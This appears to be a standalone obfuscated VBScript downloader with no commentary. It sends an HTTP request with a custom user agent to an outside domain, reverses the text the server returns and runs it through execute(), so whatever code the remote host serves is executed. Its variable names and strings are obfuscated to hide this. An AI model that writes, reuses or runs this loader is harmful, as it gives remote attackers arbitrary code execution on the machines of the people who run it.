set I66Ss=CreateObject("Msxml2.xmlhttp")
IaMZ1="nkyaZqG1zjlgdSays5YyY0vUB"
I66Ss.open StrReverse("goway") , "http://globopsl.info/?join=x5&" & IaMZ1 ,false
execute("I66Ss.setRequestHeader ""User-Agent"", ""MyCustomUser"":I66Ss.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
execute("I66Ss.send ""join=open"":B=StrReverse(I66Ss.responseText):execute(B)")
